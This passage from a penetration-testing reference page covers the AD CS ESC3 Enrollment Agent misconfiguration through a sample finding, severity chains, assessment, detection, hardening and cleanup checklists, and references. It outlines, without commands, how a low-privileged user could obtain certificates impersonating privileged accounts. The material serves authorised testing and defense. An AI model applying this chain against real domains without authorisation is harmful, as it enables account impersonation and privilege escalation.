An attacker with broader CA control may have created additional persistence.

---

# Reporting ESC3

Avoid a finding title containing only:

```text
ESC3
```

Use a title describing the actual trust failure.

Examples:

```text
Low-Privileged Users Can Obtain Enrollment Agent Certificates
```

```text
Unrestricted Enrollment Agent Template Enables Certificate Requests for Other Domain Users
```

```text
Certificate Enrollment Agent Misconfiguration Enables Privileged Account Impersonation
```

---

# Example Finding

```text
Finding:
Certificate Enrollment Agent Misconfiguration Enables Account
Impersonation

Affected CA:
CORP-CA01

Agent Template:
CorpEnrollmentAgent

Target Template:
CorpUserAuthentication

Affected Principal:
CORP\Domain Users

Description:
The CorpEnrollmentAgent certificate template is published by the
CORP-CA01 Enterprise Certification Authority.

Members of CORP\Domain Users have enrollment rights on the template.

Certificates issued from the template contain the Certificate Request
Agent application policy (1.3.6.1.4.1.311.20.2.1).

The template does not require certificate manager approval or
additional authorised signatures before issuance.

A compatible authentication certificate template is also published
by the CA and accepts certificate requests made through an Enrollment
Agent workflow.

The CA does not enforce sufficient Enrollment Agent restrictions to
limit which identities can be targeted.

Impact:
A compromised low-privileged domain account may obtain an Enrollment
Agent certificate and use it to request an authentication certificate
on behalf of another Active Directory identity.

Where a privileged account can be targeted and the resulting
certificate is accepted for certificate-based authentication, this
may result in privilege escalation and potentially Tier 0 compromise.

The issued certificates may remain usable independently of the
affected accounts' passwords until revoked, expired, or otherwise
made unusable.

Recommendation:
Restrict enrollment on Enrollment Agent certificate templates to a
small dedicated group of authorised PKI operators.

Configure Enrollment Agent restrictions on the Certification
Authority to constrain which agents may enroll for which templates
and identities.

Review target templates and ensure that sensitive authentication
templates do not accept unrestricted Enrollment Agent requests.

Where appropriate, require certificate manager approval and
authorised signatures.

Protect Enrollment Agent private keys and use hardware-backed,
non-exportable key storage where operationally feasible.

Review previously issued Enrollment Agent certificates and
on-behalf-of certificate requests for evidence of misuse.
```

---

# Severity Assessment

Severity depends on the complete chain:

```text
Who Can Obtain Agent Certificate?
            +
Which Target Templates Exist?
            +
Which Identities Can Be Targeted?
            +
What CA Restrictions Exist?
            +
Can Resulting Certificate Authenticate?
            +
What Privilege Does Target Have?
            =
Severity
```

---

# Critical Example

```text
Domain User
   |
   v
Enrollment Agent Template
   |
   v
Agent Certificate
   |
   v
User Authentication Template
   |
   v
Domain Administrator
   |
   v
Authentication
```

This can represent a critical Active Directory privilege escalation path.

---

# Lower-Risk Example

```text
Dedicated PKI Operator
        |
        v
Enrollment Agent Certificate
        |
        v
Restricted Smart Card Template
        |
        v
Employees Only
```

with strong:

```text
CA Restrictions
Monitoring
Hardware-Protected Keys
```

may represent legitimate PKI architecture rather than a vulnerability.

---

# Evidence Checklist

For an ESC3 finding record:

```text
CA Name
CA Host
Agent Template Name
Agent Template DN
Agent Template Published
Agent Template Schema Version
Certificate Request Agent EKU
Agent Enrollment Principal
Effective Enrollment Path
Manager Approval
Authorized Signatures
Agent Template Owner
Agent Template ACL
Target Template Name
Target Template DN
Target Template Schema Version
Target Template EKUs
Target Enrollment Rights
Target Issuance Requirements
CA Enrollment Agent Restrictions
Agent Certificate Serial Number
Agent Certificate Thumbprint
Target Certificate Serial Number
Target Certificate Thumbprint
Target Identity
Authentication Result
Cleanup Result
```

Never include private keys in the report.

---

# ESC3 Assessment Checklist

## Discovery

- [ ] Identify Enterprise CAs
- [ ] Enumerate certificate templates
- [ ] Identify published templates
- [ ] Identify Certificate Request Agent templates
- [ ] Identify potential ESC3 target templates
- [ ] Identify authentication-capable templates

## Agent Template

- [ ] Verify Certificate Request Agent EKU
- [ ] Verify OID `1.3.6.1.4.1.311.20.2.1`
- [ ] Verify CA publication
- [ ] Identify Enroll rights
- [ ] Identify Autoenroll rights
- [ ] Resolve nested groups
- [ ] Identify broad enrollment
- [ ] Review manager approval
- [ ] Review authorized signatures
- [ ] Review template schema version

## Agent Template ACL

- [ ] Review owner
- [ ] Review GenericAll
- [ ] Review GenericWrite
- [ ] Review WriteProperty
- [ ] Review WriteDACL
- [ ] Review WriteOwner
- [ ] Review effective enrollment path

## Target Template

- [ ] Identify candidate target
- [ ] Verify CA publication
- [ ] Record schema version
- [ ] Review authentication EKUs
- [ ] Review Client Authentication
- [ ] Review Smart Card Logon
- [ ] Review PKINIT Client Authentication
- [ ] Review target enrollment rights
- [ ] Verify target identity can enroll
- [ ] Review issuance requirements
- [ ] Review application-policy requirements

## CA Restrictions

- [ ] Enumerate Enrollment Agent restrictions
- [ ] Determine which agents are permitted
- [ ] Determine which templates are permitted
- [ ] Determine which identities are permitted
- [ ] Do not assume unrestricted on-behalf-of enrollment

## Tooling

- [ ] Enumerate with Certipy
- [ ] Enumerate with PowerShell
- [ ] Enumerate with LDAP
- [ ] Review with Certify where available
- [ ] Review BloodHound paths
- [ ] Verify installed tool versions
- [ ] Manually validate automated ESC3 results
- [ ] Distinguish ESC3 from ESC3 Target Template

## Certificate Mapping

- [ ] Review target certificate identity
- [ ] Review SID security extension
- [ ] Review strong certificate mapping
- [ ] Review Domain Controller patch level
- [ ] Determine mapped identity
- [ ] Do not assume issuance automatically equals authentication

## Validation

- [ ] Prefer read-only evidence first
- [ ] Use dedicated assessment identities
- [ ] Obtain approval before active enrollment
- [ ] Request one agent certificate
- [ ] Protect agent PFX
- [ ] Record serial number
- [ ] Record thumbprint
- [ ] Use a test target identity
- [ ] Request one on-behalf-of certificate
- [ ] Authenticate only if required
- [ ] Avoid unnecessary credential extraction
- [ ] Stop after sufficient proof

## Detection

- [ ] Inventory Enrollment Agent templates
- [ ] Baseline approved agents
- [ ] Monitor agent certificate issuance
- [ ] Monitor on-behalf-of requests
- [ ] Monitor privileged target certificates
- [ ] Monitor template changes
- [ ] Monitor template ACL changes
- [ ] Monitor CA restriction changes
- [ ] Correlate certificate authentication
- [ ] Review 5136 where applicable
- [ ] Review 4768 where applicable

## Hardening

- [ ] Restrict agent template enrollment
- [ ] Use dedicated Enrollment Agent groups
- [ ] Require approval where appropriate
- [ ] Require signatures where appropriate
- [ ] Configure CA Enrollment Agent restrictions
- [ ] Restrict target templates
- [ ] Protect agent private keys
- [ ] Use hardware-backed keys where appropriate
- [ ] Reduce certificate lifetime
- [ ] Protect template ACLs
- [ ] Remove unused agent templates
- [ ] Monitor Enrollment Agent use

## Incident Response

- [ ] Identify agent template
- [ ] Identify agent certificate
- [ ] Identify requester
- [ ] Identify certificate serial number
- [ ] Identify certificate thumbprint
- [ ] Identify all on-behalf-of requests
- [ ] Identify target certificates
- [ ] Identify target accounts
- [ ] Identify authentication activity
- [ ] Revoke agent certificate
- [ ] Revoke derived certificates
- [ ] Publish revocation information
- [ ] Review CA restrictions
- [ ] Review template changes
- [ ] Review CA changes
- [ ] Do not rely on password reset alone

## Cleanup

- [ ] Revoke assessment agent certificate where required
- [ ] Revoke assessment target certificate
- [ ] Delete PFX files
- [ ] Delete exported private keys
- [ ] Remove temporary test accounts
- [ ] Restore approved temporary configuration changes
- [ ] Verify certificates are no longer usable
- [ ] Record cleanup evidence

---

# ESC3 Testing Model

The legitimate Enrollment Agent model is:

```text
Trusted Operator
      |
      v
Enrollment Agent Certificate
      |
      v
Approved User
      |
      v
Certificate
```

The ESC3 model is:

```text
Low-Privileged User
      |
      v
Enrollment Agent Certificate
      |
      v
Another Identity
      |
      v
Authentication Certificate
```

The two-template model is:

```text
Agent Template
      |
      v
Certificate Request Agent
      |
      v
Agent Certificate
      |
      v
Target Template
      |
      v
Target Certificate
```

The complete privilege escalation model is:

```text
Low-Privileged Principal
        |
        v
Enroll
        |
        v
Agent Template
        |
        v
Certificate Request Agent EKU
        |
        v
Enrollment Agent Certificate
        |
        v
Target Authentication Template
        |
        v
On-Behalf-Of Request
        |
        v
Privileged Identity Certificate
        |
        v
Certificate Mapping
        |
        v
Authentication
        |
        v
Privilege
```

The CA restriction model is:

```text
Enrollment Agent Certificate
          |
          v
CA Restrictions
          |
          +--> Agent Allowed?
          |
          +--> Template Allowed?
          |
          +--> Target Allowed?
          |
          v
Request Accepted / Rejected
```

The modern authentication model is:

```text
Target Certificate
       |
       v
Certificate Mapping
       |
       v
Mapped Account
       |
       v
Authentication
```

The persistence model is:

```text
Enrollment Agent Certificate
          |
          v
Password Changed
          |
          X
Certificate Automatically Revoked
```

The safe-testing model is:

```text
Enumerate
   |
   v
Confirm Agent Template
   |
   v
Confirm Target Template
   |
   v
Confirm CA Restrictions
   |
   v
Use Test Agent
   |
   v
Request Agent Certificate
   |
   v
Use Test Target
   |
   v
Request On Behalf Of
   |
   v
Authenticate if Required
   |
   v
Stop
   |
   v
Revoke and Clean Up
```

The defensive model is:

```text
Restricted Agent Enrollment
          +
Enrollment Agent Restrictions
          +
Restricted Target Templates
          +
Protected Private Keys
          +
Protected Template ACLs
          +
Monitoring
          =
Reduced ESC3 Risk
```

For penetration testers:

```text
Do Not Ask:
"Does the template contain the Enrollment Agent EKU?"

Ask:
"Can my effective security context obtain an
Enrollment Agent certificate and use it against
a compatible target template to obtain a
certificate for another security principal?"
```

For defenders:

```text
Do Not Ask:
"Do we use Enrollment Agents?"

Ask:
"Exactly which principals can become Enrollment
Agents, which identities can they enroll for,
which templates can they use, and how is that
activity monitored?"
```

The most important ESC3 relationship is:

```text
Who Can Become an Agent?
          |
          v
What Can That Agent Request?
          |
          v
For Whom?
          |
          v
What Can the Resulting Certificate Do?
```

---

# Related Notes

AD CS overview:

[Active Directory Certificate Services](index.md)

AD CS enumeration:

[AD CS Enumeration](enumeration.md)

ESC1:

[AD CS ESC1](esc1.md)

ESC2:

[AD CS ESC2](esc2.md)

Active Directory ACL and ACE abuse:

[Active Directory ACL and ACE Abuse](../acl-ace.md)

Active Directory Groups:

[Active Directory Groups](../groups.md)

Kerberos:

[Kerberos](../kerberos.md)

Kerberos Tickets:

[Kerberos Tickets](../kerberos-tickets.md)

Credential Access:

[Active Directory Credential Access](../credential-access.md)

BloodHound:

[BloodHound](../bloodhound.md)

The next AD CS page is:

```text
active-directory/ad-cs/esc4.md
```

---

# References

## Microsoft - Active Directory Certificate Services

[Microsoft - Active Directory Certificate Services](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/){ target="_blank" rel="noopener noreferrer" }

---

## Microsoft - Certificate Templates

[Microsoft - Certificate Template Concepts](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts){ target="_blank" rel="noopener noreferrer" }

---

## Microsoft - Certificate Request Agent OID

[Microsoft - Object Identifiers Associated with Microsoft Cryptography](https://learn.microsoft.com/en-us/windows/win32/seccertenroll/object-identifiers){ target="_blank" rel="noopener noreferrer" }

---

## Microsoft - Certificate Services Protocols

[Microsoft - Windows Client Certificate Enrollment Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/){ target="_blank" rel="noopener noreferrer" }

---

## Microsoft - Certificate-Based Authentication Hardening

[Microsoft - KB5014754 Certificate-Based Authentication Changes](https://support.microsoft.com/help/5014754){ target="_blank" rel="noopener noreferrer" }

---

## Certipy

[Certipy](https://github.com/ly4k/Certipy){ target="_blank" rel="noopener noreferrer" }

---

## SpecterOps - Certified Pre-Owned

[SpecterOps - Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf){ target="_blank" rel="noopener noreferrer" }

---

## SpecterOps - Certify

[GhostPack Certify](https://github.com/GhostPack/Certify){ target="_blank" rel="noopener noreferrer" }

---

## BloodHound

[BloodHound Documentation](https://bloodhound.specterops.io/){ target="_blank" rel="noopener noreferrer" }

---

## MITRE ATT&CK

[MITRE ATT&CK - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/){ target="_blank" rel="noopener noreferrer" }

---

# Final Notes

ESC3 is fundamentally an:

```text
Enrollment Delegation
```

problem.

Enrollment Agents are designed to cross an identity boundary:

```text
Agent
  |
  v
Certificate for Someone Else
```

That capability is legitimate only when the delegation is tightly controlled.

The dangerous relationship is:

```text
Low-Privileged Enrollment
        +
Certificate Request Agent
        +
Compatible Target Template
        +
Insufficient CA Restrictions
        =
Potential Account Impersonation
```

ESC3 is therefore not defined solely by:

```text
Certificate Request Agent EKU
```

A complete assessment requires both sides of the workflow:

```text
Agent Template
```

and:

```text
Target Template
```

as well as:

```text
CA Enrollment Agent Restrictions
```

The full security model is:

```text
Principal
   |
   v
Can Obtain Agent Certificate?
   |
   v
Which CA?
   |
   v
Which Target Template?
   |
   v
Which Target Identity?
   |
   v
Will CA Permit the Request?
   |
   v
Will Certificate Map Correctly?
   |
   v
What Privilege Results?
```

A tool identifying:

```text
ESC3 Target Template
```

does not mean the target template is independently vulnerable.

Likewise:

```text
Enrollment Agent: True
```

does not by itself prove arbitrary account impersonation.

The assessment must establish the complete chain.

For defenders, Enrollment Agent certificates should be treated as privileged credentials because their purpose is explicitly to request certificates for other principals.

For penetration testers, the strongest ESC3 finding is not:

```text
The Certificate Request Agent EKU exists
```

but:

```text
A low-privileged principal can obtain
Enrollment Agent capability and use the
enterprise CA to issue authentication
material representing a more privileged
Active Directory identity.
```

That is the actual trust-boundary failure represented by a successfully exploitable ESC3 configuration.
